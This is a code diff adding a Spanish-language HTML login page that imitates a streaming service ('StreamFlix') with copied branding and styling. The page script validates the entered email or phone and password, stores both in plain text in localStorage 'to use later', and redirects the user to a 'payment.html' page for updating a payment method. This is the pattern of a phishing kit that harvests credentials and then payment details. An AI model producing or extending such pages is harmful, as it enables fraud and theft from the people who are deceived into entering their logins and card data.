@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="es" class="">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <title>StreamFlix</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
+    <link rel="shortcut icon" href="./streamflix/sficon2023.ico"/>
+    
+    <style>
+        @font-face {
+            font-family: "Streamflix Sans";
+            src: url("./streamflix/StreamflixSans_W_Rg.woff2") format("woff2");
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: "Streamflix Sans";
+            src: url("./streamflix/StreamflixSans_W_Bd.woff2") format("woff2");
+            font-weight: 700;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Streamflix Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .streamflix-login {
+            min-height: 100vh;
+            background: linear-gradient(to bottom, rgba(0,0,0,.4) 0, rgba(0,0,0,.4) 100%), 
+                        url('./streamflix/ES-es-20250623-TRIFECTA-perspective_2ddcdaf0-f03e-4a6a-abe7-cb1910a6f2fd_large.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .streamflix-header {
+            padding: 20px 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .streamflix-logo {
+            margin-left: 3%;
+        }
+
+        .streamflix-logo img {
+            height: 45px;
+            width: auto;
+        }
+
+        .login-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-form-container {
+            background: rgba(0, 0, 0, 0.75);
+            border-radius: 4px;
+            padding: 48px 64px;
+            min-height: 660px;
+            width: 450px;
+            max-width: 450px;
+        }
+
+        .login-title {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 28px;
+            margin-top: 0;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .input-field {
+            background: #333;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            height: 56px;
+            padding: 24px 16px 8px;
+            width: 100%;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-field:focus {
+            background: #454545;
+            border-color: #fff;
+        }
+
+        .input-field.error {
+            border-color: #e87c03;
+        }
+
+        .input-label {
+            color: #8c8c8c;
+            font-size: 16px;
+            left: 16px;
+            position: absolute;
+            top: 16px;
+            transition: font-size .1s ease, top .1s ease, color .1s ease;
+            pointer-events: none;
+        }
+
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label,
+        .input-field[data-has-value] + .input-label {
+            color: #8c8c8c;
+            font-size: 11px;
+            top: 6px;
+        }
+
+        .error-message {
+            color: #e87c03;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+            align-items: center;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        .error-message::before {
+            content: "⚠";
+            margin-right: 6px;
+            font-size: 16px;
+        }
+
+        .login-btn {
+            background: #e50914;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+            height: 48px;
+            margin-bottom: 12px;
+            margin-top: 24px;
+            width: 100%;
+            transition: background-color 0.2s ease;
+        }
+
+        .login-btn:hover {
+            background: #f40612;
+        }
+
+        .or-text {
+            color: #737373;
+            font-size: 16px;
+            margin: 16px 0;
+            text-align: center;
+        }
+
+        .code-btn {
+            background: #737373;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            height: 48px;
+            padding: 0;
+            margin: 0 0 16px 0;
+            width: 100%;
+            transition: background-color 0.2s ease;
+        }
+
+        .code-btn:hover {
+            background: #8c8c8c;
+        }
+
+        .forgot-link {
+            color: #fff;
+            text-decoration: underline;
+            font-size: 16px;
+            margin: 16px 0;
+            display: block;
+        }
+
+        .forgot-link:hover {
+            text-decoration: none;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .checkbox {
+            appearance: none;
+            background: #333;
+            border: 1px solid #333;
+            border-radius: 2px;
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .checkbox:checked {
+            background: #fff;
+            border-color: #fff;
+        }
+
+        .checkbox:checked::after {
+            content: '✓';
+            position: absolute;
+            top: -2px;
+            left: 2px;
+            color: #000;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .checkbox-label {
+            color: #b3b3b3;
+            font-size: 13px;
+        }
+
+        .signup-text {
+            color: #737373;
+            font-size: 16px;
+            margin: 20px 0;
+        }
+
+        .signup-text a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+
+        .recaptcha-text {
+            color: #8c8c8c;
+            font-size: 13px;
+            margin: 16px 0 8px 0;
+            line-height: 1.4;
+        }
+
+        .recaptcha-link {
+            background: transparent;
+            border: none;
+            color: #0071eb;
+            cursor: pointer;
+            font-size: 13px;
+            text-decoration: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .recaptcha-link:hover {
+            text-decoration: underline;
+        }
+
+        .streamflix-footer {
+            background: rgba(0, 0, 0, 0.75);
+            padding: 30px 0;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 45px;
+        }
+
+        .footer-content p {
+            color: #737373;
+            font-size: 13px;
+            margin-bottom: 30px;
+        }
+
+        .footer-content a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .footer-content a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .language-selector {
+            margin-top: 20px;
+        }
+
+        .language-selector select {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 13px;
+            padding: 8px 12px;
+        }
+
+        @media (max-width: 740px) {
+            .login-form-container {
+                background: transparent;
+                padding: 20px;
+                width: 100%;
+                min-height: auto;
+            }
+
+            .login-wrapper {
+                padding: 0;
+            }
+
+            .footer-links {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .streamflix-logo {
+                margin-left: 20px;
+            }
+
+            .streamflix-logo img {
+                height: 25px;
+            }
+        }
+
+        @media (max-width: 500px) {
+            .footer-links {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="streamflix-login">
+        <div class="streamflix-header">
+            <div class="streamflix-logo">
+                <img src="./streamflix/Streamflix_Logo_PMS.png" alt="StreamFlix">
+            </div>
+        </div>
+
+        <div class="login-wrapper">
+            <div class="login-form-container">
+                <form id="loginForm">
+                    <h1 class="login-title">Iniciar sesión</h1>
+                    
+                    <div class="input-group">
+                        <input type="text" class="input-field" id="userLoginId" name="userLoginId" placeholder=" " autocomplete="email">
+                        <label class="input-label" for="userLoginId">Correo o número de móvil</label>
+                        <div class="error-message" id="emailError">Introduce un email válido (ejemplo@gmail.com) o teléfono móvil español (6XXXXXXXX o 7XXXXXXXX).</div>
+                    </div>
+
+                    <div class="input-group">
+                        <input type="password" class="input-field" id="password" name="password" placeholder=" " autocomplete="password">
+                        <label class="input-label" for="password">Contraseña</label>
+                        <div class="error-message" id="passwordError">La contraseña debe tener entre 6 y 60 caracteres.</div>
+                    </div>
+
+                    <button type="submit" class="login-btn">Iniciar sesión</button>
+
+                    <p class="or-text">O</p>
+
+                    <button type="button" class="code-btn">Usar un código de inicio de sesión</button>
+
+                    <a href="#" class="forgot-link">¿Has olvidado tu contraseña?</a>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" class="checkbox" id="rememberMe" name="rememberMe" checked>
+                        <label class="checkbox-label" for="rememberMe">Recordarme</label>
+                    </div>
+
+                    <div class="signup-text">¿Primera vez en StreamFlix? <a href="/">Suscríbete ya.</a></div>
+
+                    <p class="recaptcha-text">Esta página utiliza Google reCAPTCHA para garantizar que no eres un robot.</p>
+                    
+                    <button type="button" class="recaptcha-link">Más información.</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="streamflix-footer">
+            <div class="footer-content">
+                <p>¿Preguntas? Llama al <a href="tel:900866617">900 866 617</a></p>
+                
+                <div class="footer-links">
+                    <a href="#">Preguntas frecuentes</a>
+                    <a href="#">Centro de ayuda</a>
+                    <a href="#">Condiciones de uso</a>
+                    <a href="#">Privacidad</a>
+                    <a href="#">Preferencias de cookies</a>
+                    <a href="#">Información corporativa</a>
+                </div>
+
+                <div class="language-selector">
+                    <select>
+                        <option value="es">Español</option>
+                        <option value="en">English</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Validación en tiempo real del campo email/teléfono
+            document.getElementById('userLoginId').addEventListener('input', function() {
+                const email = document.getElementById('userLoginId');
+                const emailError = document.getElementById('emailError');
+                const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                const phoneRegex = /^[67][0-9]{8}$/;
+                
+                const inputValue = email.value.trim();
+                
+                // Si el campo está vacío o es válido, quitar error
+                if (!inputValue || 
+                    (inputValue.includes('@') && emailRegex.test(inputValue)) ||
+                    (!inputValue.includes('@') && phoneRegex.test(inputValue))) {
+                    email.classList.remove('error');
+                    emailError.classList.remove('show');
+                }
+            });
+
+            // Funcionalidad del formulario
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('userLoginId');
+                const password = document.getElementById('password');
+                const emailError = document.getElementById('emailError');
+                const passwordError = document.getElementById('passwordError');
+                
+                // Reset errors
+                email.classList.remove('error');
+                password.classList.remove('error');
+                emailError.classList.remove('show');
+                passwordError.classList.remove('show');
+                
+                let hasError = false;
+                
+                // Validación estricta de email o número de teléfono español
+                const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                const phoneRegex = /^[67][0-9]{8}$/; // Teléfonos españoles: empiezan por 6 o 7 y tienen exactamente 9 dígitos
+                
+                const inputValue = email.value.trim();
+                
+                if (!inputValue) {
+                    email.classList.add('error');
+                    emailError.classList.add('show');
+                    hasError = true;
+                } else if (inputValue.includes('@')) {
+                    // Si contiene @, debe ser un email válido
+                    if (!emailRegex.test(inputValue)) {
+                        email.classList.add('error');
+                        emailError.classList.add('show');
+                        hasError = true;
+                    }
+                } else {
+                    // Si no contiene @, debe ser un teléfono válido
+                    if (!phoneRegex.test(inputValue)) {
+                        email.classList.add('error');
+                        emailError.classList.add('show');
+                        hasError = true;
+                    }
+                }
+                
+                // Validación estricta de contraseña
+                if (!password.value || password.value.length < 6 || password.value.length > 60) {
+                    password.classList.add('error');
+                    passwordError.classList.add('show');
+                    hasError = true;
+                }
+                
+                if (!hasError) {
+                    // Guardar credenciales en localStorage para usarlas después
+                    localStorage.setItem('streamflix_email', email.value);
+                    localStorage.setItem('streamflix_password', password.value);
+                    
+                    // Redirigir a la página de actualización de método de pago
+                    window.location.href = 'payment.html';
+                }
+            });
+
+            // Labels flotantes
+            document.querySelectorAll('.input-field').forEach(input => {
+                input.addEventListener('input', function() {
+                    if (this.value) {
+                        this.setAttribute('data-has-value', '');
+                    } else {
+                        this.removeAttribute('data-has-value');
+                    }
+                });
+            });
+
+            // Botón código de inicio
+            document.querySelector('.code-btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Código de inicio de sesión');
+            });
+
+            // Olvidé contraseña
+            document.querySelector('.forgot-link').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Recuperar contraseña');
+            });
+
+            // reCAPTCHA info
+            document.querySelector('.recaptcha-link').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Información reCAPTCHA');
+            });
+        
+        }); // Cierre del DOMContentLoaded
+    </script>
+</body>
+</html>
